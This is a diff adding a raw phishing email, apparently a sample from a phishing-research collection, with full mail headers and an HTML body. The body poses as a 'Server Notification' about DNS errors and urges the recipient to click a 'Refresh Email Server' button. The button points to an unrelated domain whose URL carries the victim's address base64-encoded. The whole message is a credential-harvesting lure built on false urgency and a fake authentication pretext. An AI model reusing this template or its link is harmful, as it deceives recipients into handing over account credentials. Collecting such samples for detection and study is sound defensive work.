@@ -1,0 +1,117 @@
+Return-Path: info@ziranceylan.com
+Delivered-To: jose@monkey.org
+X-FDA: 82575591966.29.6E03A3F
+Received: from zi.ziranceylan.com (zi.ziranceylan.com [5.149.251.158])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP id 9A08114000F
+	for <jose@monkey.org>; Tue, 17 Sep 2024 21:57:21 +0000 (UTC)
+Authentication-Results: imf17.b.hostedemail.com;	dkim=pass
+ header.d=ziranceylan.com header.s=zi header.b="l1RmX/MQ";	dmarc=pass
+ (policy=reject) header.from=ziranceylan.com;	spf=pass
+ (imf17.b.hostedemail.com: domain of info@ziranceylan.com designates
+ 5.149.251.158 as permitted sender) smtp.mailfrom=info@ziranceylan.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1726610156; a=rsa-sha256;
+	cv=none;
+	b=sdLmKEl8sM0FZ2vqK96fbbv3ionW1irCWa87xI4v53akk7dBj2dVt+WqtqXTWilqakLAuR
+	Mxt+l/I9zo3oOtgYoLQu1ujs5zv7URLLVXQVUeNSW3Wenr2tYpRRGzZQPJsF+xn1s9aMxo
+	pMCjRCvW2QPxIQwM+qH/tSUdPcHLvVM=
+ARC-Authentication-Results: i=1;	imf17.b.hostedemail.com;	dkim=pass
+ header.d=ziranceylan.com header.s=zi header.b="l1RmX/MQ";	dmarc=pass
+ (policy=reject) header.from=ziranceylan.com;	spf=pass
+ (imf17.b.hostedemail.com: domain of info@ziranceylan.com designates
+ 5.149.251.158 as permitted sender) smtp.mailfrom=info@ziranceylan.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1726610156;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=rPvQ9C9h6DCtn71/JQ5nHWufy+qDZsfos2msWDOeb5s=;
+	b=H4N/YZbQPuyMhM1sJSyU6ZWb6aima5fggw4D9mv+54K3yVNCjZd+Oc8RcIvXrR9q9i/o5D
+	eXpPR2zD/B7CGYTb/S4YTamzXRgpnzDD5ygerFrI2sbDdnVPp27pnmMmTTq68MZgjhrJbf
+	/P41yIp2tN5WFJvqbKaGaYQuHnfnxnY=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=zi; d=ziranceylan.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@ziranceylan.com;
+ bh=8yqxOyVDi0KsUjphypRlEiMaWi0=; =?utf-8?q?b=3Dl1RmX/MQFH0IxvQDaZ0Bgaav97WE?=
+ =?utf-8?q?gZYqUkdKOA2eFXFZVeI70rnpEKqq0SOIfbmq1cmUjMUYGeI5?=  
+ 7eS7adRUsFfd7OYFZ/0PEhIKT/cCuUFE3oR8VSpdQq3xeV8hhbx04wCftQUV5Ypupy2XJV9p48fM
+  
+ 0VpHfCQeoADdt2TCrrh9yxFREkgjQ5lYrzXy1OSBHXCAXY/jIrEd1xvz+85ePFBo26IKsh+Laj+M
+  
+ 2ftm0AcAyEnfyk+9dAXkWB5OazC8gJFNRAFBqrKBOoV6nSNO1VLHK1IncYH437lZCNPqtW4kPv6L
+   xKs47LKyylTMNiVJUmqZi/vm4OutuSzg3SfWJA==
+From: Server Notification  <info@ziranceylan.com>
+To: jose@monkey.org
+Subject: IMAP/POP3 Error - Refresh Email Server
+Date: 17 Sep 2024 20:46:36 +0300
+Message-ID: <20240917204636.A6A35CFDEE98ADBC@ziranceylan.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 9A08114000F
+X-Stat-Signature: ek1uxw9kdpinprtzkea4nyxdsowdsm18
+X-Spam-Status: No, score=0.20
+X-Rspam-User: 
+X-HE-Tag: 1726610241-841470
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/wvCM1yXgUneAA8m5MgrazWk4UYBqHZsR1V/bMt1buLzp?=
+ =?utf-8?q?ns1pTJ2hDd8yWpxt50XM084PQY/Coxy7qWKsjU11JVNTcJLyccCiZKM3PKXtnaj4+?=
+ =?utf-8?q?iNABE9FxYqzYP6FThJB2etvTV/wjU4xPwWLgDN/zEM/NawSP+SruVqLXvGlIcLUgu?=
+ =?utf-8?q?0VBSK+HpF00a433jk5XzF2kjflHFC4LXyJL2V1iFUVmm0FuLWQjFxhMKB7yZLlsen?=
+ =?utf-8?q?DKbe+ALNlEfVjE1eH/RqVDHgdEywCcgfcOxRWlBW5XcJ+M7oynQab2EK+FtThTcNm?=
+ =?utf-8?q?Bopq2B5HulXuDFf7YK4/XXEdrS1MK6A0Grw20n2y64GnPqxq3NEQk8rP65qcTD9fr?=
+ =?utf-8?q?vMiF+iwAdO01FDN6CjMuUfXdT3kpJNWb2vN4K6qaWTHTerD6tux5T0XnAfdMRErsc?=
+ =?utf-8?q?hXmqzPx0Kv0l3Ne7F1dum7CqiN2p6LN/2HKgZqpVKgaVNBTnZb1rMsSpIoMRYycfZ?=
+ =?utf-8?q?RV3MVzUWmvq26jbWqBNwcYDMblo73aTQBi22IETpe6G5N7Hotpi/pb5m/Kfz9ToL1?=
+ =?utf-8?q?QW/r6tyezGV6LsNBsKv79pAqQq+Gk/yqkzNc4tKPePoi3O9MLlQeGQwUTysdzGC7l?=
+ =?utf-8?q?KkFvUiJ2FPPQXL+kAiHjGB5kzPg+9ffjyQnGA62KJ7jj2L44AkVQwRro5biEvAYep?=
+ =?utf-8?q?lm6e9OvH7JCtmtuN6x33Mg4BI10EAnThwF4g4PK7GgK8RcxD+wDZ8ilriJXSeeZ/q?=
+ =?utf-8?q?rZvLVOj7i7Evn5ZRqWsy5OEop6ua1Qh7IB1MBaVfFxYzDRUAy+xC/T9JBqBa1UV0J?=
+ =?utf-8?q?LP7kimPPL4jKkfq0ySRRICMFm/g5zQJ98yzZtMZlGaJOAti8RiEOlMpJeKKmrwXPg?=
+ =?utf-8?q?Bc0ChWWqN8Ypq4DjwQ2yMD1H3g1g3lrqKtNRCddKdojBmo88YLjiH3LZVQolqpFlP?=
+ =?utf-8?q?nzrSQDrf0ZtbsngadNTowJ_O97/oPozObKxKgB3Zj7YjzSJRC0H9t/0fPaeY4lEAz?=
+ =?utf-8?q?8YWUHFu4UzAoVlxFn3gz2QWbi2aWS+VEp+LOnw5phAgjGzSDw=3D=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 266
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<p><span style=3D"font-family: Tahoma,Geneva, sans-serif;"><strong>Attentio=
+n:&nbsp;</strong>jose@monkey.org Due to&nbsp;DNS server errors, some emails=
+ are failing to reach your inbox. To fix this,You need to complete the foll=
+owing operations as soon as possible (Two-way Authentication)&nbsp; please =
+refresh your email server using the session information provided to authent=
+icate your account</span></p><span></span>
+<p><span style=3D"font-family: Tahoma,Geneva, sans-serif;">Thank you for yo=
+ur prompt action.</span></p><span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial;">
+
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19699">
+<DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px"><SPAN style=3D"FONT-SIZE: =
+14px; FONT-FAMILY: Tahoma, Geneva, sans-serif"><BR></SPAN>
+<TABLE cellSpacing=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, Ar=
+ial, sans-serif; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PA=
+DDING-LEFT: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(3=
+8,114,236)' bgColor=3D#2672ec><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: =
+Tahoma, Geneva, sans-serif">
+<A style=3D'FONT-FAMILY: "Segoe UI Semibold", "Segoe UI Bold", "Segoe UI", =
+"Helvetica Neue Medium", Arial, sans-serif; FONT-WEIGHT: 600; COLOR: rgb(25=
+5,255,255); TEXT-ALIGN: center; LETTER-SPACING: 0.02em; text-decoration-lin=
+e: none' href=3D"https://absrx.padgysoltis.com/#am9zZUBtb25rZXkub3Jn" rel=
+=3D"noopener noreferrer">Refresh Email Server</A></SPAN></TD></TR></TBODY><=
+/TABLE></DIV></DIV></BODY></HTML>
+
